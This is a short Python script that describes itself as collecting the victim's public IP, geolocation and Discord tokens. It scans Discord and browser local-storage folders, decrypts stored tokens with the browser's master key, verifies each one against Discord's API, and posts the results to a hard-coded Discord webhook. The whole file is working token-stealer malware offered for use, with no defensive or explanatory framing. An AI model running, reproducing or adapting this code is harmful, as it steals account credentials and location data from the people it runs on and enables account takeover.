"""
main.py — run: python3 main.py
Collects public IP + Discord tokens from local storage,
posts to webhook. No args, no config.
"""

import base64
import json
import os
import re
import sys

WEBHOOK = "https://discord.com/api/webhooks/1553144386424930394/80-8uNaAeMZ58KjdUMONSxIlR81e6kJ14pP040-7eia_U1M5h-G87iaUlrizWrrscw5c"

# ---------------------------------------------------------------------------
# http helper — avoids requiring `requests`
# ---------------------------------------------------------------------------
def _post(url, payload):
    try:
        import urllib.request
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            url, data=data,
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=10).read()
        return True
    except Exception:
        return False


def _get_json(url):
    try:
        import urllib.request
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        return json.loads(urllib.request.urlopen(req, timeout=8).read().decode())
    except Exception:
        return {}


# ---------------------------------------------------------------------------
# IP
# ---------------------------------------------------------------------------
def grab_ip():
    for src in ("https://api.ipify.org?format=json",
                "https://ipinfo.io/json",
                "https://ifconfig.me/all.json"):
        d = _get_json(src)
        ip = d.get("ip") or d.get("query")
        if ip:
            geo = _get_json(f"http://ip-api.com/json/{ip}")
            return ip, geo
    return "unknown", {}


# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------
_L = os.getenv("LOCALAPPDATA", "")
_R = os.getenv("APPDATA", "")
_HOME = os.path.expanduser("~")

TOKEN_PATHS = {
    "Discord":        os.path.join(_R, "discord", "Local Storage", "leveldb"),
    "Discord Canary": os.path.join(_R, "discordcanary", "Local Storage", "leveldb"),
    "Discord PTB":    os.path.join(_R, "discordptb", "Local Storage", "leveldb"),
    "Chrome":         os.path.join(_L, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
    "Chrome Profile 1": os.path.join(_L, "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),
    "Edge":           os.path.join(_L, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
    "Brave":          os.path.join(_L, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
    "Opera":          os.path.join(_R, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
    "Opera GX":       os.path.join(_R, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
    # Linux/mac fallbacks
    "Discord (Linux)": os.path.join(_HOME, ".config", "discord", "Local Storage", "leveldb"),
    "Chrome (Linux)":  os.path.join(_HOME, ".config", "google-chrome", "Default", "Local Storage", "leveldb"),
    "Chrome (mac)":    os.path.join(_HOME, "Library", "Application Support", "Google", "Chrome", "Default", "Local Storage", "leveldb"),
}

TOKEN_RE = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}")
ENC_RE = re.compile(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)")


# ---------------------------------------------------------------------------
# Decrypt
# ---------------------------------------------------------------------------
def _master_key(folder):
    try:
        import win32crypt
        state = os.path.join(folder, "..", "..", "Local State")
        with open(state, "r", encoding="utf-8") as f:
            s = json.load(f)
        key = base64.b64decode(s["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception:
        return None


def _decrypt(blob, key):
    try:
        from Crypto.Cipher import AES
        iv, payload = blob[3:15], blob[15:]
        c = AES.new(key, AES.MODE_GCM, iv)
        return c.decrypt(payload)[:-16].decode(errors="ignore")
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Scan
# ---------------------------------------------------------------------------
def scan_tokens(folder):
    found = set()
    if not os.path.isdir(folder):
        return found
    key = _master_key(folder)
    for root, _, files in os.walk(folder):
        for f in files:
            if not (f.endswith(".log") or f.endswith(".ldb")):
                continue
            try:
                text = open(os.path.join(root, f), "rb").read().decode("latin-1", errors="ignore")
            except Exception:
                continue
            for m in TOKEN_RE.findall(text):
                found.add(m)
            if key:
                for b64 in ENC_RE.findall(text):
                    try:
                        d = _decrypt(base64.b64decode(b64), key)
                        if d and TOKEN_RE.fullmatch(d):
                            found.add(d)
                    except Exception:
                        continue
    return found


def whoami(token):
    d = _get_json("https://discord.com/api/v9/users/@me") if False else None
    try:
        import urllib.request
        req = urllib.request.Request(
            "https://discord.com/api/v9/users/@me",
            headers={"Authorization": token, "User-Agent": "Mozilla/5.0"},
        )
        d = json.loads(urllib.request.urlopen(req, timeout=6).read().decode())
        return f"{d.get('username','?')}#{d.get('discriminator','0')} ({d.get('id','?')})"
    except Exception:
        return "unverified"


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    ip, geo = grab_ip()

    hits = []
    for name, path in TOKEN_PATHS.items():
        for t in scan_tokens(path):
            hits.append((name, t, whoami(t)))

    fields = [
        {"name": "IP", "value": ip, "inline": True},
        {"name": "Country", "value": geo.get("country", "?"), "inline": True},
        {"name": "ISP", "value": geo.get("isp", "?"), "inline": False},
        {"name": "Tokens Found", "value": str(len(hits)), "inline": False},
    ]
    for name, tok, user in hits:
        fields.append({"name": f"{name} — {user}", "value": f"```{tok}```", "inline": False})

    payload = {
        "embeds": [{
            "title": "beacon",
            "color": 0x2B2B2B,
            "fields": fields,
        }]
    }

    _post(WEBHOOK, payload)
    print(f"[+] sent — {len(hits)} token(s), ip {ip}")


if __name__ == "__main__":
    main()
